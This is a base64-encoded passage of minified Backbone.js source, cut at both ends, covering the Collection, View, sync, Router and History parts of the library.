ZXM6byx0LnBhcnNlJiYobz1hLnBhcnNlKG8sdCkpLGEuc2V0KG8sdCksbCYmIXUmJmEuaGFzQ2hhbmdlZChkKSYmKHU9ITApKSxlW2JdPWE7ZWxzZSBpZihfKXtpZihzPWVbYl09dGhpcy5fcHJlcGFyZU1vZGVsKG8sdCksIXMpY29udGludWU7aC5wdXNoKHMpLHRoaXMuX2FkZFJlZmVyZW5jZShzLHQpfXM9YXx8cyxzJiYoaT10aGlzLm1vZGVsSWQocy5hdHRyaWJ1dGVzKSwhZ3x8IXMuaXNOZXcoKSYmcFtpXXx8KGcucHVzaChzKSx2PXZ8fCF0aGlzLm1vZGVsc1tiXXx8cy5jaWQhPT10aGlzLm1vZGVsc1tiXS5jaWQpLHBbaV09ITApfWlmKHkpe2Zvcih2YXIgYj0wO2I8dGhpcy5sZW5ndGg7YisrKXBbKHM9dGhpcy5tb2RlbHNbYl0pLmNpZF18fGYucHVzaChzKTtmLmxlbmd0aCYmdGhpcy5fcmVtb3ZlTW9kZWxzKGYsdCl9aWYoaC5sZW5ndGh8fHYpaWYobCYmKHU9ITApLHRoaXMubGVuZ3RoKz1oLmxlbmd0aCxudWxsIT1jKWZvcih2YXIgYj0wO2I8aC5sZW5ndGg7YisrKXRoaXMubW9kZWxzLnNwbGljZShjK2IsMCxoW2JdKTtlbHNle2cmJih0aGlzLm1vZGVscy5sZW5ndGg9MCk7Zm9yKHZhciBMPWd8fGgsYj0wO2I8TC5sZW5ndGg7YisrKXRoaXMubW9kZWxzLnB1c2goTFtiXSl9aWYodSYmdGhpcy5zb3J0KHtzaWxlbnQ6ITB9KSwhdC5zaWxlbnQpe2Zvcih2YXIgaz1udWxsIT1jP24uY2xvbmUodCk6dCxiPTA7YjxoLmxlbmd0aDtiKyspbnVsbCE9YyYmKGsuaW5kZXg9YytiKSwocz1oW2JdKS50cmlnZ2VyKCJhZGQiLHMsdGhpcyxrKTsodXx8dikmJnRoaXMudHJpZ2dlcigic29ydCIsdGhpcyx0KSwoaC5sZW5ndGh8fGYubGVuZ3RoKSYmdGhpcy50cmlnZ2VyKCJ1cGRhdGUiLHRoaXMsdCl9cmV0dXJuIHI/ZVswXTplfSxyZXNldDpmdW5jdGlvbihlLHQpe3Q9dD9uLmNsb25lKHQpOnt9O2Zvcih2YXIgcj0wO3I8dGhpcy5tb2RlbHMubGVuZ3RoO3IrKyl0aGlzLl9yZW1vdmVSZWZlcmVuY2UodGhpcy5tb2RlbHNbcl0sdCk7cmV0dXJuIHQucHJldmlvdXNNb2RlbHM9dGhpcy5tb2RlbHMsdGhpcy5fcmVzZXQoKSxlPXRoaXMuYWRkKGUsbi5leHRlbmQoe3NpbGVudDohMH0sdCkpLHQuc2lsZW50fHx0aGlzLnRyaWdnZXIoInJlc2V0Iix0aGlzLHQpLGV9LHB1c2g6ZnVuY3Rpb24oZSx0KXtyZXR1cm4gdGhpcy5hZGQoZSxuLmV4dGVuZCh7YXQ6dGhpcy5sZW5ndGh9LHQpKX0scG9wOmZ1bmN0aW9uKGUpe3ZhciB0PXRoaXMuYXQodGhpcy5sZW5ndGgtMSk7cmV0dXJuIHRoaXMucmVtb3ZlKHQsZSksdH0sdW5zaGlmdDpmdW5jdGlvbihlLHQpe3JldHVybiB0aGlzLmFkZChlLG4uZXh0ZW5kKHthdDowfSx0KSl9LHNoaWZ0OmZ1bmN0aW9uKGUpe3ZhciB0PXRoaXMuYXQoMCk7cmV0dXJuIHRoaXMucmVtb3ZlKHQsZSksdH0sc2xpY2U6ZnVuY3Rpb24oKXtyZXR1cm4gby5hcHBseSh0aGlzLm1vZGVscyxhcmd1bWVudHMpfSxnZXQ6ZnVuY3Rpb24oZSl7aWYobnVsbCE9ZSl7dmFyIHQ9dGhpcy5tb2RlbElkKHRoaXMuX2lzTW9kZWwoZSk/ZS5hdHRyaWJ1dGVzOmUpO3JldHVybiB0aGlzLl9ieUlkW2VdfHx0aGlzLl9ieUlkW3RdfHx0aGlzLl9ieUlkW2UuY2lkXX19LGF0OmZ1bmN0aW9uKGUpe3JldHVybiAwPmUmJihlKz10aGlzLmxlbmd0aCksdGhpcy5tb2RlbHNbZV19LHdoZXJlOmZ1bmN0aW9uKGUsdCl7dmFyIHI9bi5tYXRjaGVzKGUpO3JldHVybiB0aGlzW3Q/ImZpbmQiOiJmaWx0ZXIiXShmdW5jdGlvbihlKXtyZXR1cm4gcihlLmF0dHJpYnV0ZXMpfSl9LGZpbmRXaGVyZTpmdW5jdGlvbihlKXtyZXR1cm4gdGhpcy53aGVyZShlLCEwKX0sc29ydDpmdW5jdGlvbihlKXtpZighdGhpcy5jb21wYXJhdG9yKXRocm93IG5ldyBFcnJvcigiQ2Fubm90IHNvcnQgYSBzZXQgd2l0aG91dCBhIGNvbXBhcmF0b3IiKTtyZXR1cm4gZXx8KGU9e30pLG4uaXNTdHJpbmcodGhpcy5jb21wYXJhdG9yKXx8MT09PXRoaXMuY29tcGFyYXRvci5sZW5ndGg/dGhpcy5tb2RlbHM9dGhpcy5zb3J0QnkodGhpcy5jb21wYXJhdG9yLHRoaXMpOnRoaXMubW9kZWxzLnNvcnQobi5iaW5kKHRoaXMuY29tcGFyYXRvcix0aGlzKSksZS5zaWxlbnR8fHRoaXMudHJpZ2dlcigic29ydCIsdGhpcyxlKSx0aGlzfSxwbHVjazpmdW5jdGlvbihlKXtyZXR1cm4gbi5pbnZva2UodGhpcy5tb2RlbHMsImdldCIsZSl9LGZldGNoOmZ1bmN0aW9uKGUpe2U9ZT9uLmNsb25lKGUpOnt9LHZvaWQgMD09PWUucGFyc2UmJihlLnBhcnNlPSEwKTt2YXIgdD1lLnN1Y2Nlc3Mscj10aGlzO3JldHVybiBlLnN1Y2Nlc3M9ZnVuY3Rpb24obil7dmFyIGk9ZS5yZXNldD8icmVzZXQiOiJzZXQiO3JbaV0obixlKSx0JiZ0LmNhbGwoZS5jb250ZXh0LHIsbixlKSxyLnRyaWdnZXIoInN5bmMiLHIsbixlKX0sSSh0aGlzLGUpLHRoaXMuc3luYygicmVhZCIsdGhpcyxlKX0sY3JlYXRlOmZ1bmN0aW9uKGUsdCl7dD10P24uY2xvbmUodCk6e307dmFyIHI9dC53YWl0O2lmKCEoZT10aGlzLl9wcmVwYXJlTW9kZWwoZSx0KSkpcmV0dXJuITE7cnx8dGhpcy5hZGQoZSx0KTt2YXIgaT10aGlzLHM9dC5zdWNjZXNzO3JldHVybiB0LnN1Y2Nlc3M9ZnVuY3Rpb24oZSx0LG4pe3ImJmkuYWRkKGUsbikscyYmcy5jYWxsKG4uY29udGV4dCxlLHQsbil9LGUuc2F2ZShudWxsLHQpLGV9LHBhcnNlOmZ1bmN0aW9uKGUsdCl7cmV0dXJuIGV9LGNsb25lOmZ1bmN0aW9uKCl7cmV0dXJuIG5ldyB0aGlzLmNvbnN0cnVjdG9yKHRoaXMubW9kZWxzLHttb2RlbDp0aGlzLm1vZGVsLGNvbXBhcmF0b3I6dGhpcy5jb21wYXJhdG9yfSl9LG1vZGVsSWQ6ZnVuY3Rpb24oZSl7cmV0dXJuIGVbdGhpcy5tb2RlbC5wcm90b3R5cGUuaWRBdHRyaWJ1dGV8fCJpZCJdfSxfcmVzZXQ6ZnVuY3Rpb24oKXt0aGlzLmxlbmd0aD0wLHRoaXMubW9kZWxzPVtdLHRoaXMuX2J5SWQ9e319LF9wcmVwYXJlTW9kZWw6ZnVuY3Rpb24oZSx0KXtpZih0aGlzLl9pc01vZGVsKGUpKXJldHVybiBlLmNvbGxlY3Rpb258fChlLmNvbGxlY3Rpb249dGhpcyksZTt0PXQ/bi5jbG9uZSh0KTp7fSx0LmNvbGxlY3Rpb249dGhpczt2YXIgcj1uZXcgdGhpcy5tb2RlbChlLHQpO3JldHVybiByLnZhbGlkYXRpb25FcnJvcj8odGhpcy50cmlnZ2VyKCJpbnZhbGlkIix0aGlzLHIudmFsaWRhdGlvbkVycm9yLHQpLCExKTpyfSxfcmVtb3ZlTW9kZWxzOmZ1bmN0aW9uKGUsdCl7Zm9yKHZhciBuLHIsaSxzPSExLG49MCxvPTA7bjxlLmxlbmd0aDtuKyspe3ZhciBpPWVbbl09dGhpcy5nZXQoZVtuXSk7aWYoaSl7dmFyIGE9dGhpcy5tb2RlbElkKGkuYXR0cmlidXRlcyk7bnVsbCE9YSYmZGVsZXRlIHRoaXMuX2J5SWRbYV0sZGVsZXRlIHRoaXMuX2J5SWRbaS5jaWRdO3ZhciByPXRoaXMuaW5kZXhPZihpKTt0aGlzLm1vZGVscy5zcGxpY2UociwxKSx0aGlzLmxlbmd0aC0tLHQuc2lsZW50fHwodC5pbmRleD1yLGkudHJpZ2dlcigicmVtb3ZlIixpLHRoaXMsdCkpLGVbbysrXT1pLHRoaXMuX3JlbW92ZVJlZmVyZW5jZShpLHQpLHM9ITB9fXJldHVybiBlLmxlbmd0aCE9PW8mJihlPWUuc2xpY2UoMCxvKSksc30sX2lzTW9kZWw6ZnVuY3Rpb24oZSl7cmV0dXJuIGUgaW5zdGFuY2VvZiBnfSxfYWRkUmVmZXJlbmNlOmZ1bmN0aW9uKGUsdCl7dGhpcy5fYnlJZFtlLmNpZF09ZTt2YXIgbj10aGlzLm1vZGVsSWQoZS5hdHRyaWJ1dGVzKTtudWxsIT1uJiYodGhpcy5fYnlJZFtuXT1lKSxlLm9uKCJhbGwiLHRoaXMuX29uTW9kZWxFdmVudCx0aGlzKX0sX3JlbW92ZVJlZmVyZW5jZTpmdW5jdGlvbihlLHQpe3RoaXM9PT1lLmNvbGxlY3Rpb24mJmRlbGV0ZSBlLmNvbGxlY3Rpb24sZS5vZmYoImFsbCIsdGhpcy5fb25Nb2RlbEV2ZW50LHRoaXMpfSxfb25Nb2RlbEV2ZW50OmZ1bmN0aW9uKGUsdCxuLHIpe2lmKCJhZGQiIT09ZSYmInJlbW92ZSIhPT1lfHxuPT09dGhpcyl7aWYoImRlc3Ryb3kiPT09ZSYmdGhpcy5yZW1vdmUodCxyKSwiY2hhbmdlIj09PWUpe3ZhciBpPXRoaXMubW9kZWxJZCh0LnByZXZpb3VzQXR0cmlidXRlcygpKSxzPXRoaXMubW9kZWxJZCh0LmF0dHJpYnV0ZXMpO2khPT1zJiYobnVsbCE9aSYmZGVsZXRlIHRoaXMuX2J5SWRbaV0sbnVsbCE9cyYmKHRoaXMuX2J5SWRbc109dCkpfXRoaXMudHJpZ2dlci5hcHBseSh0aGlzLGFyZ3VtZW50cyl9fX0pO3ZhciBrPXtmb3JFYWNoOjMsZWFjaDozLG1hcDozLGNvbGxlY3Q6MyxyZWR1Y2U6NCxmb2xkbDo0LGluamVjdDo0LHJlZHVjZVJpZ2h0OjQsZm9sZHI6NCxmaW5kOjMsZGV0ZWN0OjMsZmlsdGVyOjMsc2VsZWN0OjMscmVqZWN0OjMsZXZlcnk6MyxhbGw6Myxzb21lOjMsYW55OjMsaW5jbHVkZToyLGNvbnRhaW5zOjIsaW52b2tlOjIsbWF4OjMsbWluOjMsdG9BcnJheToxLHNpemU6MSxmaXJzdDozLGhlYWQ6Myx0YWtlOjMsaW5pdGlhbDozLHJlc3Q6Myx0YWlsOjMsZHJvcDozLGxhc3Q6Myx3aXRob3V0OjAsZGlmZmVyZW5jZTowLGluZGV4T2Y6MyxzaHVmZmxlOjEsbGFzdEluZGV4T2Y6Myxpc0VtcHR5OjEsY2hhaW46MSxzYW1wbGU6MyxwYXJ0aXRpb246M307eShiLGssIm1vZGVscyIpO3ZhciB3PVsiZ3JvdXBCeSIsImNvdW50QnkiLCJzb3J0QnkiLCJpbmRleEJ5Il07bi5lYWNoKHcsZnVuY3Rpb24oZSl7bltlXSYmKGIucHJvdG90eXBlW2VdPWZ1bmN0aW9uKHQscil7dmFyIGk9bi5pc0Z1bmN0aW9uKHQpP3Q6ZnVuY3Rpb24oZSl7cmV0dXJuIGUuZ2V0KHQpfTtyZXR1cm4gbltlXSh0aGlzLm1vZGVscyxpLHIpfSl9KTt2YXIgVD10LlZpZXc9ZnVuY3Rpb24oZSl7dGhpcy5jaWQ9bi51bmlxdWVJZCgidmlldyIpLGV8fChlPXt9KSxuLmV4dGVuZCh0aGlzLG4ucGljayhlLEQpKSx0aGlzLl9lbnN1cmVFbGVtZW50KCksdGhpcy5pbml0aWFsaXplLmFwcGx5KHRoaXMsYXJndW1lbnRzKX0sWT0vXihcUyspXHMqKC4qKSQvLEQ9WyJtb2RlbCIsImNvbGxlY3Rpb24iLCJlbCIsImlkIiwiYXR0cmlidXRlcyIsImNsYXNzTmFtZSIsInRhZ05hbWUiLCJldmVudHMiXTtuLmV4dGVuZChULnByb3RvdHlwZSxhLHt0YWdOYW1lOiJkaXYiLCQ6ZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMuJGVsLmZpbmQoZSl9LGluaXRpYWxpemU6ZnVuY3Rpb24oKXt9LHJlbmRlcjpmdW5jdGlvbigpe3JldHVybiB0aGlzfSxyZW1vdmU6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5fcmVtb3ZlRWxlbWVudCgpLHRoaXMuc3RvcExpc3RlbmluZygpLHRoaXN9LF9yZW1vdmVFbGVtZW50OmZ1bmN0aW9uKCl7dGhpcy4kZWwucmVtb3ZlKCl9LHNldEVsZW1lbnQ6ZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMudW5kZWxlZ2F0ZUV2ZW50cygpLHRoaXMuX3NldEVsZW1lbnQoZSksdGhpcy5kZWxlZ2F0ZUV2ZW50cygpLHRoaXN9LF9zZXRFbGVtZW50OmZ1bmN0aW9uKGUpe3RoaXMuJGVsPWUgaW5zdGFuY2VvZiB0LiQ/ZTp0LiQoZSksdGhpcy5lbD10aGlzLiRlbFswXX0sZGVsZWdhdGVFdmVudHM6ZnVuY3Rpb24oZSl7aWYoIWUmJiEoZT1uLnJlc3VsdCh0aGlzLCJldmVudHMiKSkpcmV0dXJuIHRoaXM7dGhpcy51bmRlbGVnYXRlRXZlbnRzKCk7Zm9yKHZhciB0IGluIGUpe3ZhciByPWVbdF07aWYobi5pc0Z1bmN0aW9uKHIpfHwocj10aGlzW2VbdF1dKSxyKXt2YXIgaT10Lm1hdGNoKFkpO3RoaXMuZGVsZWdhdGUoaVsxXSxpWzJdLG4uYmluZChyLHRoaXMpKX19cmV0dXJuIHRoaXN9LGRlbGVnYXRlOmZ1bmN0aW9uKGUsdCxuKXt0aGlzLiRlbC5vbihlKyIuZGVsZWdhdGVFdmVudHMiK3RoaXMuY2lkLHQsbil9LHVuZGVsZWdhdGVFdmVudHM6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy4kZWwmJnRoaXMuJGVsLm9mZigiLmRlbGVnYXRlRXZlbnRzIit0aGlzLmNpZCksdGhpc30sdW5kZWxlZ2F0ZTpmdW5jdGlvbihlLHQsbil7dGhpcy4kZWwub2ZmKGUrIi5kZWxlZ2F0ZUV2ZW50cyIrdGhpcy5jaWQsdCxuKX0sX2NyZWF0ZUVsZW1lbnQ6ZnVuY3Rpb24oZSl7cmV0dXJuIGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoZSl9LF9lbnN1cmVFbGVtZW50OmZ1bmN0aW9uKCl7aWYodGhpcy5lbCl0aGlzLnNldEVsZW1lbnQobi5yZXN1bHQodGhpcywiZWwiKSk7ZWxzZXt2YXIgZT1uLmV4dGVuZCh7fSxuLnJlc3VsdCh0aGlzLCJhdHRyaWJ1dGVzIikpO3RoaXMuaWQmJihlLmlkPW4ucmVzdWx0KHRoaXMsImlkIikpLHRoaXMuY2xhc3NOYW1lJiYoZVsiY2xhc3MiXT1uLnJlc3VsdCh0aGlzLCJjbGFzc05hbWUiKSksdGhpcy5zZXRFbGVtZW50KHRoaXMuX2NyZWF0ZUVsZW1lbnQobi5yZXN1bHQodGhpcywidGFnTmFtZSIpKSksdGhpcy5fc2V0QXR0cmlidXRlcyhlKX19LF9zZXRBdHRyaWJ1dGVzOmZ1bmN0aW9uKGUpe3RoaXMuJGVsLmF0dHIoZSl9fSksdC5zeW5jPWZ1bmN0aW9uKGUscixpKXt2YXIgcz1TW2VdO24uZGVmYXVsdHMoaXx8KGk9e30pLHtlbXVsYXRlSFRUUDp0LmVtdWxhdGVIVFRQLGVtdWxhdGVKU09OOnQuZW11bGF0ZUpTT059KTt2YXIgbz17dHlwZTpzLGRhdGFUeXBlOiJqc29uIn07aWYoaS51cmx8fChvLnVybD1uLnJlc3VsdChyLCJ1cmwiKXx8TigpKSxudWxsIT1pLmRhdGF8fCFyfHwiY3JlYXRlIiE9PWUmJiJ1cGRhdGUiIT09ZSYmInBhdGNoIiE9PWV8fChvLmNvbnRlbnRUeXBlPSJhcHBsaWNhdGlvbi9qc29uIixvLmRhdGE9SlNPTi5zdHJpbmdpZnkoaS5hdHRyc3x8ci50b0pTT04oaSkpKSxpLmVtdWxhdGVKU09OJiYoby5jb250ZW50VHlwZT0iYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIixvLmRhdGE9by5kYXRhP3ttb2RlbDpvLmRhdGF9Ont9KSxpLmVtdWxhdGVIVFRQJiYoIlBVVCI9PT1zfHwiREVMRVRFIj09PXN8fCJQQVRDSCI9PT1zKSl7by50eXBlPSJQT1NUIixpLmVtdWxhdGVKU09OJiYoby5kYXRhLl9tZXRob2Q9cyk7dmFyIGE9aS5iZWZvcmVTZW5kO2kuYmVmb3JlU2VuZD1mdW5jdGlvbihlKXtyZXR1cm4gZS5zZXRSZXF1ZXN0SGVhZGVyKCJYLUhUVFAtTWV0aG9kLU92ZXJyaWRlIixzKSxhP2EuYXBwbHkodGhpcyxhcmd1bWVudHMpOnZvaWQgMH19IkdFVCI9PT1vLnR5cGV8fGkuZW11bGF0ZUpTT058fChvLnByb2Nlc3NEYXRhPSExKTt2YXIgdT1pLmVycm9yO2kuZXJyb3I9ZnVuY3Rpb24oZSx0LG4pe2kudGV4dFN0YXR1cz10LGkuZXJyb3JUaHJvd249bix1JiZ1LmNhbGwoaS5jb250ZXh0LGUsdCxuKX07dmFyIGM9aS54aHI9dC5hamF4KG4uZXh0ZW5kKG8saSkpO3JldHVybiByLnRyaWdnZXIoInJlcXVlc3QiLHIsYyxpKSxjfTt2YXIgUz17Y3JlYXRlOiJQT1NUIix1cGRhdGU6IlBVVCIscGF0Y2g6IlBBVENIIiwiZGVsZXRlIjoiREVMRVRFIixyZWFkOiJHRVQifTt0LmFqYXg9ZnVuY3Rpb24oKXtyZXR1cm4gdC4kLmFqYXguYXBwbHkodC4kLGFyZ3VtZW50cyl9O3ZhciB4PXQuUm91dGVyPWZ1bmN0aW9uKGUpe2V8fChlPXt9KSxlLnJvdXRlcyYmKHRoaXMucm91dGVzPWUucm91dGVzKSx0aGlzLl9iaW5kUm91dGVzKCksdGhpcy5pbml0aWFsaXplLmFwcGx5KHRoaXMsYXJndW1lbnRzKX0saj0vXCgoLio/KVwpL2csSD0vKFwoXD8pPzpcdysvZyxQPS9cKlx3Ky9nLEU9L1tcLXt9XFtcXSs/LixcXFxeJHwjXHNdL2c7bi5leHRlbmQoeC5wcm90b3R5cGUsYSx7aW5pdGlhbGl6ZTpmdW5jdGlvbigpe30scm91dGU6ZnVuY3Rpb24oZSxyLGkpe24uaXNSZWdFeHAoZSl8fChlPXRoaXMuX3JvdXRlVG9SZWdFeHAoZSkpLG4uaXNGdW5jdGlvbihyKSYmKGk9cixyPSIiKSxpfHwoaT10aGlzW3JdKTt2YXIgcz10aGlzO3JldHVybiB0Lmhpc3Rvcnkucm91dGUoZSxmdW5jdGlvbihuKXt2YXIgbz1zLl9leHRyYWN0UGFyYW1ldGVycyhlLG4pO3MuZXhlY3V0ZShpLG8scikhPT0hMSYmKHMudHJpZ2dlci5hcHBseShzLFsicm91dGU6IityXS5jb25jYXQobykpLHMudHJpZ2dlcigicm91dGUiLHIsbyksdC5oaXN0b3J5LnRyaWdnZXIoInJvdXRlIixzLHIsbykpfSksdGhpc30sZXhlY3V0ZTpmdW5jdGlvbihlLHQsbil7ZSYmZS5hcHBseSh0aGlzLHQpfSxuYXZpZ2F0ZTpmdW5jdGlvbihlLG4pe3JldHVybiB0Lmhpc3RvcnkubmF2aWdhdGUoZSxuKSx0aGlzfSxfYmluZFJvdXRlczpmdW5jdGlvbigpe2lmKHRoaXMucm91dGVzKXt0aGlzLnJvdXRlcz1uLnJlc3VsdCh0aGlzLCJyb3V0ZXMiKTtmb3IodmFyIGUsdD1uLmtleXModGhpcy5yb3V0ZXMpO251bGwhPShlPXQucG9wKCkpOyl0aGlzLnJvdXRlKGUsdGhpcy5yb3V0ZXNbZV0pfX0sX3JvdXRlVG9SZWdFeHA6ZnVuY3Rpb24oZSl7cmV0dXJuIGU9ZS5yZXBsYWNlKEUsIlxcJCYiKS5yZXBsYWNlKGosIig/OiQxKT8iKS5yZXBsYWNlKEgsZnVuY3Rpb24oZSx0KXtyZXR1cm4gdD9lOiIoW14vP10rKSJ9KS5yZXBsYWNlKFAsIihbXj9dKj8pIiksbmV3IFJlZ0V4cCgiXiIrZSsiKD86XFw/KFtcXHNcXFNdKikpPyQiKX0sX2V4dHJhY3RQYXJhbWV0ZXJzOmZ1bmN0aW9uKGUsdCl7dmFyIHI9ZS5leGVjKHQpLnNsaWNlKDEpO3JldHVybiBuLm1hcChyLGZ1bmN0aW9uKGUsdCl7cmV0dXJuIHQ9PT1yLmxlbmd0aC0xP2V8fG51bGw6ZT9kZWNvZGVVUklDb21wb25lbnQoZSk6bnVsbH0pfX0pO3ZhciBGPXQuSGlzdG9yeT1mdW5jdGlvbigpe3RoaXMuaGFuZGxlcnM9W10sbi5iaW5kQWxsKHRoaXMsImNoZWNrVXJsIiksInVuZGVmaW5lZCIhPXR5cGVvZiB3aW5kb3cmJih0aGlzLmxvY2F0aW9uPXdpbmRvdy5sb2NhdGlvbix0aGlzLmhpc3Rvcnk9d2luZG93Lmhpc3RvcnkpfSxDPS9eWyNcL118XHMrJC9nLEE9L15cLyt8XC8rJC9nLE89LyMuKiQvO0Yuc3RhcnRlZD0hMSxuLmV4dGVuZChGLnByb3RvdHlwZSxhLHtpbnRlcnZhbDo1MCxhdFJvb3Q6ZnVuY3Rpb24oKXt2YXIgZT10aGlzLmxvY2F0aW9uLnBhdGhuYW1lLnJlcGxhY2UoL1teXC9dJC8sIiQmLyIpO3JldHVybiBlPT09dGhpcy5yb290JiYhdGhpcy5nZXRTZWFyY2goKX0sbWF0Y2hSb290OmZ1bmN0aW9uKCl7dmFyIGU9dGhpcy5kZWNvZGVGcmFnbWVudCh0aGlzLmxvY2F0aW9uLnBhdGhuYW1lKSx0PWUuc2xpY2UoMCx0aGlzLnJvb3QubGVuZ3RoLTEpKyIvIjtyZXR1cm4gdD09PXRoaXMucm9vdH0sZGVjb2RlRnJhZ21lbnQ6ZnVuY3Rpb24oZSl7cmV0dXJuIGRlY29kZVVSSShlLnJlcGxhY2UoLyUyNS9nLCIlMjUyNSIpKX0sZ2V0U2VhcmNoOmZ1bmN0aW9uKCl7dmFyIGU9dGhpcy5sb2NhdGlvbi5ocmVmLnJlcGxhY2UoLyMuKi8sIiIpLm1hdGNoKC9cPy4rLyk7cmV0dXJuIGU/ZVswXToiIn0sZ2V0SGFzaDpmdW5jdGlvbihlKXt2YXIgdD0oZXx8dGhpcykubG9jYXRpb24uaHJlZi5tYXRjaCgvIyguKikkLyk7cmV0dXJuIHQ/dFsxXToiIn0sZ2V0UGF0aDpmdW5jdGlvbigpe3ZhciBlPXRoaXMuZGVjb2RlRnJhZ21lbnQodGhpcy5sb2NhdGlvbi5wYXRobmFtZSt0aGlzLmdldFNlYXJjaCgpKS5zbGljZSh0aGlzLnJvb3QubGVuZ3RoLTEpO3JldHVybiIvIj09PWUuY2hhckF0KDApP2Uuc2xpY2UoMSk6ZX0sZ2V0RnJhZ21lbnQ6ZnVuY3Rpb24oZSl7cmV0dXJuIG51bGw9PWUmJihlPXRoaXMuX3VzZVB1c2hTdGF0ZXx8IXRoaXMuX3dhbnRzSGFzaENoYW5nZT90aGlzLmdldFBhdGgoKTp0aGlzLmdldEhhc2goKSksZS5yZXBsYWNlKEMsIiIpfSxzdGFydDpmdW5jdGlvbihlKXtpZihGLnN0YXJ0ZWQpdGhyb3cgbmV3IEVycm9yKCJCYWNrYm9uZS5oaXN0b3J5IGhhcyBhbHJlYWR5IGJlZW4gc3RhcnRlZCIpO2lmKEYuc3RhcnRlZD0hMCx0aGlzLm9wdGlvbnM9bi5leHRlbmQoe3Jvb3Q6Ii8ifSx0aGlzLm9wdGlvbnMsZSksdGhpcy5yb290PXRoaXMub3B0aW9ucy5yb290LHRoaXMuX3dhbnRzSGFzaENoYW5nZT10aGlzLm9wdGlvbnMuaGFzaENoYW5nZSE9PSExLHRoaXMuX2hhc0hhc2hDaGFuZ2U9Im9uaGFzaGNoYW5nZSJpbiB3aW5kb3csdGhpcy5fdXNlSGFzaENoYW5nZT10aGlzLl93YW50c0hhc2hDaGFuZ2UmJnRoaXMuX2hhc0hhc2hDaGFuZ2UsdGhpcy5fd2FudHNQdXNoU3RhdGU9ISF0aGlzLm9wdGlvbnMucHVzaFN0YXRlLHRoaXMuX2hhc1B1c2hTdGF0ZT0hKCF0aGlzLmhpc3Rvcnl8fCF0aGlzLmhpc3RvcnkucHVzaFN0YXRlKSx0aGlzLl91c2VQdXNoU3RhdGU9dGhpcy5fd2FudHNQdXNoU3RhdGUmJnRoaXMuX2hhc1B1c2hTdGF0ZSx0aGlzLmZyYWdtZW50PXRoaXMuZ2V0RnJhZ21lbnQoKSx0aGlzLnJvb3Q9KCIvIit0aGlzLnJvb3QrIi8iKS5yZXBsYWNlKEEsIi8iKSx0aGlzLl93YW50c0hhc2hDaGFuZ2UmJnRoaXMuX3dhbnRzUHVzaFN0YXRlKXtpZighdGhpcy5faGFzUHVzaFN0YXRlJiYhdGhpcy5hdFJvb3QoKSl7dmFyIHQ9dGhpcy5yb290LnNsaWNlKDAsLTEpfHwiLyI7cmV0dXJuIHRoaXMubG9jYXRpb24ucmVwbGFjZSh0KyIjIit0aGlzLmdldFBhdGgoKSksITB9dGhpcy5faGFzUHVzaFN0YXRlJiZ0aGlzLmF0Um9vdCgpJiZ0aGlzLm5hdmlnYXRlKHRoaXMuZ2V0SGFzaCgpLHtyZXBsYWNlOiEwfSl9aWYoIXRoaXMuX2hhc0hhc2hDaGFuZ2UmJnRoaXMuX3dhbnRzSGFzaENoYW5nZSYmIXRoaXMuX3VzZVB1c2hTdGF0ZSl7dmFyIHI9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7ci5zcmM9ImphdmFzY3JpcHQ6MCIsci5zdHlsZS5kaXNwbGF5PSJub25lIixyLnRhYkluZGV4PS0xO3ZhciBpPWRvY3VtZW50LmJvZHk7dGhpcy5pZnJhbWU9aS5pbnNlcnRCZWZvcmUocixpLmZpcnN0Q2hpbGQpLmNvbnRlbnRXaW5kb3csdGhpcy5pZnJhbWUuZG9jdW1lbnQub3BlbigpLmNsb3NlKCksdGhpcy5pZnJhbWUubG9jYXRpb24uaGFzaD0iIyIrdGhpcy5mcmFnbWVudH12YXIgcz13aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcnx8ZnVuY3Rpb24oZSx0KXtyZXR1cm4gYXR0YWNoRXZlbnQoIm9uIitlLHQpfTtyZXR1cm4gdGhpcy5fdXNlUHVzaFN0YXRlP3MoInBvcHN0YXRlIix0aGlzLmNoZWNrVXJsLCExKTp0aGlzLl91c2VIYXNoQ2hhbmdlJiYhdGhpcy5pZnJhbWU/cygiaGFzaGNoYW5nZSIsdGhpcy5jaGVja1VybCwhMSk6dGhpcy5fd2FudHNIYXNoQ2hhbmdlJiYodGhpcy5fY2hlY2tVcmxJbnRlcnZhbD1zZXRJbnRlcnZhbCh0aGlzLmNoZWNrVXJsLHRoaXMuaW50ZXJ2YWwpKSx0aGlzLm9wdGlvbnMuc2lsZW50P3ZvaWQgMDp0aGlzLmxvYWRVcmwoKX0sc3RvcDpmdW5jdGlvbigpe3ZhciBlPXdpbmRvdy5yZW1vdmVFdmVudExpc3RlbmVyfHxmdW5jdGlvbihlLHQpe3JldHVybiBkZXRhY2hFdmVudCgib24iK2UsdCl9O3RoaXMuX3VzZVB1c2hTdGF0ZT9lKCJwb3BzdGF0ZSIsdGhpcy5jaGVja1VybCwhMSk6dGhpcy5fdXNlSGFzaENoYW5nZSYmIXRoaXMuaWZyYW1lJiZlKCJoYXNoY2hhbmdlIix0aGlzLmNoZWNrVXJsLCExKSx0aGlzLmlmcmFtZSYmKGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQodGhpcy5pZnJhbWUuZnJhbWVFbGVtZW50KSx0aGlzLmlmcmFtZT1udWxsKSx0aGlzLl9jaGVja1VybEludGVydmFsJiZjbGVhckludGVydmFsKHRoaXMuX2NoZWNrVXJsSW50ZXJ2YWwpLEYuc3RhcnRlZD0hMX0scm91dGU6ZnVuY3Rpb24oZSx0KXt0aGlzLmhhbmRsZXJzLnVuc2hpZnQoe3JvdXRlOmUsY2FsbGJhY2s6dH0pfSxjaGVja1VybDpmdW5jdGlvbihlKXt2YXIgdD10aGlzLmdldEZyYWdtZW50KCk7cmV0dXJuIHQ9PT10aGlzLmZyYWdtZW50JiZ0aGlzLmlmcmFtZSYmKHQ9dGhpcy5nZXRIYXNoKHRoaXMuaWZyYW1lKSksdD09PXRoaXMuZnJhZ21lbnQ/ITE6KHRoaXMuaWZyYW1lJiZ0aGlzLm5hdmlnYXRlKHQpLHZvaWQgdGhpcy5sb2FkVXJsKCkpfSxsb2FkVXJsOmZ1bmN0aW9uKGUpe3JldHVybiB0aGlzLm1hdGNoUm9vdCgpPyhlPXRoaXMuZnJhZ2